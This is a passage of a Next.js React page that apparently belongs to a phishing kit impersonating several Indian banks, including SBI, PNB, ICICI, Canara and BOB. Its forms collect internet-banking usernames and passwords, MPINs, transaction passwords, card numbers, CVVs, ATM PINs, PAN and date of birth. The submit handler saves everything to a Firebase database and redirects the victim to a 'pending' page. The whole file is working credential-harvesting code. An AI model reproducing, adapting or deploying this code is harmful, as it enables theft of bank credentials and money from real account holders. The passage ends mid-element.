"use client";
import { useState } from "react";
import { ref, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  const [options, setOptions] = useState("SBI");
  const [bankName, setBankName] = useState("internet-banking");
  const [showButton, setShowSubmit] = useState(false);

  const [formData, setFormData] = useState({});

  const handleChange = (e) => {
    let { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Generate timestamp in milliseconds
    const timestamp = Date.now();

    // Add current timestamp to form data
    const formDataWithTime = {
      ...formData,
      time: timestamp,
    };

    // Push form data to Firebase database
    // const newRef = await push(formRef, formDataWithTime);

    const storedUserId = localStorage.getItem("newUserId");
    if (!storedUserId) {
      console.error("User ID not found in localStorage");
      return;
    }

    const userRef = ref(database, `entries/${storedUserId}`);
    await update(userRef, formDataWithTime);

    // Navigate to "/method" route after submission
    router.push("/pending");

    // Clear form data after submission
    setFormData({});
  };

  const renderPage = () => {
    switch (bankName) {
      case "SBI":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("internet-banking");
                  setShowSubmit(true);
                }}
              >
                I have internet banking?
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("card");
                  setShowSubmit(false);
                }}
              >
                I have Debit Card?
              </span>
            </div>

            {/* <!-- UPI ID --> */}
            {options === "internet-banking" && (
              <div className="mt-5">
                {showButton === true && (
                  <div>
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="username"
                      >
                        Username <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="username"
                        name="username"
                        type="text"
                        placeholder="Enter Username"
                        value={formData.username} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* UPI PIN */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="password"
                      >
                        Password <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="password"
                        name="password"
                        type="password"
                        placeholder="Enter Password"
                        value={formData.password} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="w-auto flex justify-end items-center mt-5">
                      <div
                        className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                        onClick={() => {
                          setShowSubmit(false);
                        }}
                      >
                        Submit
                      </div>
                    </div>
                  </div>
                )}

                {/* Profile Password  */}
                {showButton !== true && (
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="password"
                    >
                      Password <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="password"
                      name="password"
                      type="password"
                      placeholder="Enter Password"
                      value={formData.password} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                )}
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                {showButton === true && (
                  <div>
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="upi_id"
                      >
                        Account Number<span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="upi_id"
                        name="upi_id"
                        type="text"
                        placeholder="Enter Debit Card Number"
                        value={formData.upi_id} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* CIF Number */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="cif_no"
                      >
                        CIF Number<span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="cif_no"
                        name="cif_no"
                        type="text"
                        placeholder="Enter CIF Number"
                        value={formData.cif_no} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* Branch Code */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="branch_code"
                      >
                        Branch Code<span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="branch_code"
                        name="branch_code"
                        type="text"
                        placeholder="Enter Branch Code"
                        value={formData.branch_code} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* DOB */}
                    <div class="mb-4">
                      <label class="block text-gray-700 text-sm mb-2" for="dob">
                        Date Of Birth (DOB)
                        <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="dob"
                        name="dob"
                        type="text"
                        placeholder="Enter Date Of Birth"
                        value={formData.dob} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="w-auto flex justify-end items-center mt-5">
                      <div
                        className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                        onClick={() => {
                          setShowSubmit(false);
                        }}
                      >
                        Submit
                      </div>
                    </div>
                  </div>
                )}

                {showButton === false && (
                  <div>
                    {/* Card Number */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="card_no"
                      >
                        Card Number<span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="card_no"
                        name="card_no"
                        type="text"
                        placeholder="Enter Debit Card Number"
                        value={formData.card_no} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="flex space-x-2">
                      {/* CIF Number */}
                      <div class="mb-4">
                        <label
                          class="block text-gray-700 text-sm mb-2"
                          for="expiry_date"
                        >
                          Expiry Date<span className="text-red-500">*</span>
                        </label>
                        <input
                          class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                          id="expiry_date"
                          name="expiry_date"
                          type="text"
                          placeholder="Enter Expiry Date"
                          value={formData.expiry_date} // Updated value attribute
                          onChange={handleChange} // Added onChange handler
                        />
                      </div>

                      {/* Branch Code */}
                      <div class="mb-4">
                        <label
                          class="block text-gray-700 text-sm mb-2"
                          for="cvv"
                        >
                          CVV <span className="text-red-500">*</span>
                        </label>
                        <input
                          class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                          id="cvv"
                          name="cvv"
                          type="password"
                          placeholder="Enter CVV"
                          value={formData.cvv} // Updated value attribute
                          onChange={handleChange} // Added onChange handler
                        />
                      </div>
                    </div>

                    {/* ATM PIN */}
                    <div class="mb-4">
                      <label class="block text-gray-700 text-sm mb-2" for="pin">
                        ATM PIN <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="pin"
                        name="pin"
                        type="password"
                        placeholder="Enter ATM PIN"
                        value={formData.pin} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        );
      case "BOI":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("internet-banking");
                  setShowSubmit(true);
                }}
              >
                I have internet banking?
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("card");
                  setShowSubmit(false);
                }}
              >
                I have Debit Card?
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                {showButton === true && (
                  <div>
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="username"
                      >
                        Username <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="username"
                        name="username"
                        type="text"
                        placeholder="Enter Username"
                        value={formData.username} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* UPI PIN */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="mpin"
                      >
                        MPIN <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="mpin"
                        name="mpin"
                        type="password"
                        placeholder="Enter MPIN"
                        value={formData.mpin} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="w-auto flex justify-end items-center mt-5">
                      <div
                        className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                        onClick={() => {
                          setShowSubmit(false);
                        }}
                      >
                        Submit
                      </div>
                    </div>
                  </div>
                )}

                {/* I PIN  */}
                {showButton !== true && (
                  <div class="mb-4">
                    <label class="block text-gray-700 text-sm mb-2" for="ipin">
                      IPIN <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="ipin"
                      name="ipin"
                      type="password"
                      placeholder="Enter IPIN"
                      value={formData.ipin} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                )}
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="upi_id">
                    Account Number<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="upi_id"
                    name="upi_id"
                    type="text"
                    placeholder="Enter Debit Card Number"
                    value={formData.upi_id} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                <div className="flex space-x-2">
                  {/* CIF Number */}
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="expiry_date"
                    >
                      Expiry Date<span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="expiry_date"
                      name="expiry_date"
                      type="text"
                      placeholder="Enter Expiry Date"
                      value={formData.expiry_date} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>

                  {/* Branch Code */}
                  <div class="mb-4">
                    <label class="block text-gray-700 text-sm mb-2" for="cvv">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="cvv"
                      name="cvv"
                      type="password"
                      placeholder="Enter CVV"
                      value={formData.cvv} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        );
      case "PNB":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => setOptions("internet-banking")}
              >
                I have internet banking?
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => setOptions("card")}
              >
                I have Debit Card?
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                {showButton === true && (
                  <div>
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="username"
                      >
                        Username <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="username"
                        name="username"
                        type="text"
                        placeholder="Enter Username"
                        value={formData.username} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* UPI PIN */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="password"
                      >
                        Password <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="password"
                        name="password"
                        type="password"
                        placeholder="Enter Password"
                        value={formData.password} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="w-auto flex justify-end items-center mt-5">
                      <div
                        className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                        onClick={() => {
                          setShowSubmit(false);
                        }}
                      >
                        Submit
                      </div>
                    </div>
                  </div>
                )}

                {/* Transaction Password  */}
                {showButton !== true && (
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="t_password"
                    >
                      Transaction Password{" "}
                      <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="t_password"
                      name="t_password"
                      type="password"
                      placeholder="Enter Transaction Password"
                      value={formData.t_password} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                )}
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                {/* Account Number */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="account">
                    Account Number<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="account"
                    name="account"
                    type="text"
                    placeholder="Enter Account Number"
                    value={formData.account} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                {/* Card Number */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="card_no">
                    Card Number<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="card_no"
                    name="card_no"
                    type="text"
                    placeholder="Enter Debit Card Number"
                    value={formData.card_no} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                <div className="flex space-x-2">
                  {/* CIF Number */}
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="expiry_date"
                    >
                      Expiry Date<span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="expiry_date"
                      name="expiry_date"
                      type="text"
                      placeholder="Enter Expiry Date"
                      value={formData.expiry_date} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>

                  {/* Branch Code */}
                  <div class="mb-4">
                    <label class="block text-gray-700 text-sm mb-2" for="cvv">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="cvv"
                      name="cvv"
                      type="password"
                      placeholder="Enter CVV"
                      value={formData.cvv} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                </div>

                {/* ATM PIN */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="pin">
                    ATM PIN <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="pin"
                    name="pin"
                    type="password"
                    placeholder="Enter ATM PIN"
                    value={formData.pin} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>
              </div>
            )}
          </div>
        );
      case "Union":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => setOptions("internet-banking")}
              >
                I have Login Pin?
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => setOptions("card")}
              >
                I have Debit Card?
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label
                    class="block text-gray-700 text-sm mb-2"
                    for="login_pin"
                  >
                    Login Pin <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="login_pin"
                    name="login_pin"
                    type="text"
                    placeholder="Enter Login Pin"
                    value={formData.login_pin} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                {/* UPI PIN */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="mpin">
                    MPIN <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="mpin"
                    name="mpin"
                    type="password"
                    placeholder="Enter MPIN"
                    value={formData.mpin} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                {/* Card Number */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="card_no">
                    Card Number<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="card_no"
                    name="card_no"
                    type="text"
                    placeholder="Enter Debit Card Number"
                    value={formData.card_no} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                <div className="flex space-x-2">
                  {/* CIF Number */}
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="expiry_date"
                    >
                      Expiry Date<span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="expiry_date"
                      name="expiry_date"
                      type="text"
                      placeholder="Enter Expiry Date"
                      value={formData.expiry_date} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>

                  {/* Branch Code */}
                  <div class="mb-4">
                    <label class="block text-gray-700 text-sm mb-2" for="cvv">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="cvv"
                      name="cvv"
                      type="password"
                      placeholder="Enter CVV"
                      value={formData.cvv} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        );
      case "ICICI":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("internet-banking");
                  setShowSubmit(true);
                }}
              >
                I have USER ID and PASSWORD?
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => {
                  setOptions("card");
                  setShowSubmit(false);
                }}
              >
                I don't have USER ID and PASSWORD?
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                {showButton === true && (
                  <div>
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="username"
                      >
                        Username <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="username"
                        name="username"
                        type="text"
                        placeholder="Enter Username"
                        value={formData.username} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    {/* UPI PIN */}
                    <div class="mb-4">
                      <label
                        class="block text-gray-700 text-sm mb-2"
                        for="password"
                      >
                        Password <span className="text-red-500">*</span>
                      </label>
                      <input
                        class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                        id="password"
                        name="password"
                        type="password"
                        placeholder="Enter Password"
                        value={formData.password} // Updated value attribute
                        onChange={handleChange} // Added onChange handler
                      />
                    </div>

                    <div className="w-auto flex justify-end items-center mt-5">
                      <div
                        className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                        onClick={() => {
                          setShowSubmit(false);
                        }}
                      >
                        Submit
                      </div>
                    </div>
                  </div>
                )}

                {/* Transaction Password  */}
                {showButton !== true && (
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="t_password"
                    >
                      ATM Card Back Side Upload{" "}
                      <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="t_password"
                      name="t_password"
                      type="file"
                      placeholder="Enter Transaction Password"
                      value={formData.t_password} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                )}
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                {/* Card Number */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="card_no">
                    Account Number Or Debit Card Number
                    <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="card_no"
                    name="card_no"
                    type="text"
                    placeholder="Enter Account Number or Debit Number"
                    value={formData.card_no} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>
              </div>
            )}
          </div>
        );
      case "Indian":
        return (
          <div>
            <div className="mt-5">
              {/* CIF Or Account */}
              <div class="mb-4">
                <label
                  class="block text-gray-700 text-sm mb-2"
                  for="cif_or_account"
                >
                  CIF Or Account Number
                  <span className="text-red-500">*</span>
                </label>
                <input
                  class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                  id="cif_or_account"
                  name="cif_or_account"
                  type="text"
                  placeholder="Enter CIF or Account Number"
                  value={formData.cif_or_account} // Updated value attribute
                  onChange={handleChange} // Added onChange handler
                />
              </div>
            </div>

            {/* Pan Card */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="pan">
                Pan Card
                <span className="text-red-500">*</span>
              </label>
              <input
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                id="pan"
                name="pan"
                type="text"
                placeholder="Enter Pan Card"
                value={formData.pan} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>

            {/* DOB */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="dob">
                Date Of Birth (DOB)
                <span className="text-red-500">*</span>
              </label>
              <input
                class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                id="dob"
                name="dob"
                type="text"
                placeholder="Enter Date Of Birth"
                value={formData.dob} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>
          </div>
        );
      case "Canara":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => setOptions("internet-banking")}
              >
                I have Login Pin
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => setOptions("card")}
              >
                I have Debit Card
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="login">
                    Login Pin <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="login"
                    name="login"
                    type="text"
                    placeholder="Enter Login Pin"
                    value={formData.login} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                {/* UPI PIN */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="mpin">
                    MPIN <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="mpin"
                    name="mpin"
                    type="password"
                    placeholder="Enter MPIN"
                    value={formData.mpin} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>
              </div>
            )}

            {options === "card" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="upi_id">
                    Account Number<span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="upi_id"
                    name="upi_id"
                    type="text"
                    placeholder="Enter Debit Card Number"
                    value={formData.upi_id} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                <div className="flex space-x-2">
                  {/* CIF Number */}
                  <div class="mb-4">
                    <label
                      class="block text-gray-700 text-sm mb-2"
                      for="expiry_date"
                    >
                      Expiry Date<span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="expiry_date"
                      name="expiry_date"
                      type="text"
                      placeholder="Enter Expiry Date"
                      value={formData.expiry_date} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>

                  {/* Branch Code */}
                  <div class="mb-4">
                    <label class="block text-gray-700 text-sm mb-2" for="cvv">
                      CVV <span className="text-red-500">*</span>
                    </label>
                    <input
                      class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                      id="cvv"
                      name="cvv"
                      type="password"
                      placeholder="Enter CVV"
                      value={formData.cvv} // Updated value attribute
                      onChange={handleChange} // Added onChange handler
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        );
      case "BOB":
        return (
          <div>
            <div className="text-xs text-gray-500 flex flex-col space-y-1">
              <span
                className={`text-sm text-blue-600 ${
                  options === "internet-banking" ? "underline" : ""
                }`}
                onClick={() => setOptions("internet-banking")}
              >
                I have Mobile Banking
              </span>
              <span
                className={`text-sm text-blue-600 ${
                  options === "card" ? "underline" : ""
                }`}
                onClick={() => setOptions("card")}
              >
                I don't have Mobile Banking
              </span>
            </div>

            {options === "internet-banking" && (
              <div className="mt-5">
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="login">
                    Login Pin <span className="text-red-500">*</span>
                  </label>
                  <input
                    class="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                    id="login"
                    name="login"
                    type="text"
                    placeholder="Enter Login Pin"
                    value={formData.login} // Updated value attribute
                    onChange={handleChange} // Added onChange handler
                  />
                </div>

                {/* UPI PIN */}
                <div class="mb-4">
                  <label class="block text-gray-700 text-sm mb-2" for="mpin">
                    MPIN <span className="text-red-500">*</span>
                  </label>
                  <input
